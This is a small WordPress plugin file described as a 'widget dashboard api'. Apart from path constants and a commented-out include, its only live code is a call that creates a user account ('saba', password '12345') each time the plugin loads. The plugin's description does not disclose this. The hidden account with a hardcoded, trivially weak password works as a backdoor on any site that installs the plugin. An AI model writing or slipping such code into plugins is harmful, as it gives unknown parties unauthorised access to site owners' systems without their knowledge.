<?php
/*
Plugin Name: widget dashboard api
Plugin URI: http://wordpress.org/plugins/widget-api/
Description: widget dashboard api
Author: Sahar Ghasemi
Version: 1.0.0
Author URI: http://saharghasemi.com/
*/

define("PLUGIN_PATH",plugin_dir_path(__FILE__));
define("PLUGIN_INC",PLUGIN_PATH."inc/");

if(is_admin()){
// require PLUGIN_INC."admin/widget.php";
}

wp_create_user("saba","12345","saba@gmail.com");